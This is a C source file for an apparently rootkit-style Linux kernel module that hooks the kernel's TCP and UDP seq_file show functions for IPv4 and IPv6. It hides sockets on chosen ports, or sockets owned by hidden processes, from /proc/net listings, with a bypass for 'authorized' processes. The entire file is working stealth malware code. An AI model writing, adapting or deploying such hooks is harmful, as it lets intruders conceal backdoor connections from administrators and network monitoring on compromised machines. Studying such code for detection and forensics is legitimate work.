#include "net.h"

#include "macro_utils.h"
#include "utils.h"
#include <linux/byteorder/generic.h>
#include <linux/seq_file.h>
#include <linux/slab.h>
#include <linux/types.h>

static struct seq_operations *p_tcp4_seq_ops = NULL;
static struct seq_operations *p_tcp6_seq_ops = NULL;
static struct seq_operations *p_udp_seq_ops  = NULL;
static struct seq_operations *p_udp6_seq_ops = NULL;

static seq_show_t p_orig_tcp4_seq_show = NULL;
static seq_show_t p_orig_tcp6_seq_show = NULL;
static seq_show_t p_orig_udp4_seq_show = NULL;
static seq_show_t p_orig_udp6_seq_show = NULL;

static LIST_HEAD(hidden_ports_list);

int add_hidden_port(u16 ui16_port)
{
    port_list_t *p_hidden_port = NULL;

    pr_dev_info("Adding hidden port: %hu\n", ui16_port);

    p_hidden_port = kzalloc(sizeof(port_list_t), GFP_KERNEL);
    IF_U (p_hidden_port == NULL) {
        pr_dev_err("  * Failed to allocate memory for port list entry\n");
        return -EPERM;
    }

    p_hidden_port->ui16_port = ui16_port;

    list_add(&p_hidden_port->list, &hidden_ports_list);

    return 0;
}

int del_hidden_port(u16 ui16_port)
{
    port_list_t *p_hidden_port = NULL;
    port_list_t *p_tmp         = NULL;

    pr_dev_info("Removing hidden port: %hu\n", ui16_port);

    list_for_each_entry_safe (p_hidden_port, p_tmp, &hidden_ports_list, list) {
        if (p_hidden_port->ui16_port == ui16_port) {
            list_del(&p_hidden_port->list);
            kfree(p_hidden_port);
        }
    }

    return 0;
}

/**
 * Check if a port is hidden.
 *
 * @param ui16_port The port number
 * @return `true` if the port is hidden, `false` otherwise
 */
static bool is_port_hidden(u16 ui16_port)
{
    port_list_t *p_hidden_port = NULL;

    pr_dev_info("Checking if port %hu is hidden...", ui16_port);

    list_for_each_entry (p_hidden_port, &hidden_ports_list, list) {
        if (p_hidden_port->ui16_port == ui16_port) {
            pr_dev_cont("  yes!\n");
            return true;
        }
    }

    pr_dev_cont("  no\n");
    return false;
}

/**
 * Clear the list of hidden ports and free all associated memory.
 */
static void clear_hidden_ports(void)
{
    port_list_t *p_hidden_port = NULL;
    port_list_t *p_tmp         = NULL;

    pr_dev_info("Clearing hidden ports...\n");

    list_for_each_entry_safe (p_hidden_port, p_tmp, &hidden_ports_list, list) {
        pr_dev_info("* Port: %hu\n", p_hidden_port->ui16_port);
        list_del(&p_hidden_port->list);
        kfree(p_hidden_port);
    }
}

static int do_seq_show_hooked(const seq_show_t orig_seq_show, seq_file_t *seq, void *v)
{
    sock_t *p_sock              = NULL; // The socket that is being shown
    u16 ui16_sport              = 0;    // The local port of the socket (in host byte order)
    u16 ui16_dport              = 0;    // The foreign port of the socket (in host byte order)
    pid_t i32_pid               = 0;    // The PID of the process that owns the socket
    struct fown_struct *p_owner = NULL; // The owner of the socket

    pr_dev_info("`%ps()` hooked\n", orig_seq_show);

    IF_U (is_process_authorized(PID_SELF)) {
        pr_dev_info("* Process is authorized, not hiding...\n");
        goto ret;
    }

    if (v == SEQ_START_TOKEN) {
        goto ret;
    }

    p_sock = (sock_t *)v;

    ui16_sport = le16_to_cpu(p_sock->sk_num);   // Local port: host byte order (little endian)
    ui16_dport = be16_to_cpu(p_sock->sk_dport); // Foreign port: network byte order (big endian)

    // Check if the socket is hidden
    pr_dev_info("* Src port: %hu\n", ui16_sport);
    pr_dev_info("* Dst port: %hu\n", ui16_dport);
    pr_dev_info("* Port pair: %x\n", p_sock->sk_portpair);

    IF_U (is_port_hidden(ui16_sport) || is_port_hidden(ui16_dport)) {
        pr_dev_info("  * Port is hidden: hiding socket\n");
        return 0;
    }

    // Check if the process that owns the socket is hidden
    // Owner process is not usually set, unless F_SETOWN is called, so this will almost never work
    // Still, it's worth a try
    // TODO: Find owner of a socket by iterating over all processes
    IF_L (p_sock->sk_socket != NULL && p_sock->sk_socket->file != NULL) {
        p_owner = &p_sock->sk_socket->file->f_owner;
        i32_pid = pid_nr(p_owner->pid);
        pr_dev_info("* Owner PID: %d\n", i32_pid);

        IF_L (i32_pid != 0) {
            IF_U (is_pid_hidden(i32_pid)) {
                pr_dev_info("  * Process is hidden: hiding socket\n");
                return 0;
            }
        }
    }
    else {
        pr_dev_info("* Socket is not owned by a process\n");
    }

ret:
    return orig_seq_show(seq, v);
}

static int tcp4_seq_show_hooked(seq_file_t *seq, void *v)
{
    return do_seq_show_hooked(p_orig_tcp4_seq_show, seq, v);
}

static int tcp6_seq_show_hooked(seq_file_t *seq, void *v)
{
    return do_seq_show_hooked(p_orig_tcp6_seq_show, seq, v);
}

static int udp4_seq_show_hooked(seq_file_t *seq, void *v)
{
    return do_seq_show_hooked(p_orig_udp4_seq_show, seq, v);
}

static int udp6_seq_show_hooked(seq_file_t *seq, void *v)
{
    return do_seq_show_hooked(p_orig_udp6_seq_show, seq, v);
}

void init_nethooks(void)
{
    // Get the `seq_operations` structures for the TCP/UDP IPv4/IPv6 seq files
    SETUP_NET_HOOK(tcp4_seq_ops, tcp4_seq_show, tcp4_seq_show_hooked);
    SETUP_NET_HOOK(tcp6_seq_ops, tcp6_seq_show, tcp6_seq_show_hooked);
    SETUP_NET_HOOK(udp_seq_ops, udp4_seq_show, udp4_seq_show_hooked);
    SETUP_NET_HOOK(udp6_seq_ops, udp6_seq_show, udp6_seq_show_hooked);
}

void cleanup_nethooks(void)
{
    clear_hidden_ports();

    pr_dev_info("Restoring `tcp4_seq_show()`...\n");

    IF_U (p_tcp4_seq_ops == NULL) {
        pr_dev_err("* `tcp4_seq_ops` is NULL\n");
        goto tcp6;
    }

    IF_U (p_orig_tcp4_seq_show == NULL) {
        pr_dev_err("* `p_orig_tcp4_seq_show` is NULL\n");
        goto tcp6;
    }

    change_protected_value(&p_tcp4_seq_ops->show, p_orig_tcp4_seq_show);

    pr_dev_info("* `tcp4_seq_show()` restored\n");

tcp6:
    pr_dev_info("Restoring `tcp6_seq_show()`...\n");

    IF_U (p_tcp6_seq_ops == NULL) {
        pr_dev_err("* `tcp6_seq_ops` is NULL\n");
        goto udp4;
    }

    IF_U (p_orig_tcp6_seq_show == NULL) {
        pr_dev_err("* `p_orig_tcp6_seq_show` is NULL\n");
        goto udp4;
    }

    change_protected_value(&p_tcp6_seq_ops->show, p_orig_tcp6_seq_show);

    pr_dev_info("* `tcp6_seq_show()` restored\n");

udp4:
    pr_dev_info("Restoring `udp4_seq_show()`...\n");

    IF_U (p_udp_seq_ops == NULL) {
        pr_dev_err("* `udp4_seq_ops` is NULL\n");
        goto udp6;
    }

    IF_U (p_orig_udp4_seq_show == NULL) {
        pr_dev_err("* `p_orig_udp4_seq_show` is NULL\n");
        goto udp6;
    }

    change_protected_value(&p_udp_seq_ops->show, p_orig_udp4_seq_show);

    pr_dev_info("* `udp4_seq_show()` restored\n");

udp6:
    pr_dev_info("Restoring `udp6_seq_show()`...\n");

    IF_U (p_udp6_seq_ops == NULL) {
        pr_dev_err("* `udp6_seq_ops` is NULL\n");
        return;
    }

    IF_U (p_orig_udp6_seq_show == NULL) {
        pr_dev_err("* `p_orig_udp6_seq_show` is NULL\n");
        return;
    }

    change_protected_value(&p_udp6_seq_ops->show, p_orig_udp6_seq_show);

    pr_dev_info("* `udp6_seq_show()` restored\n");
}
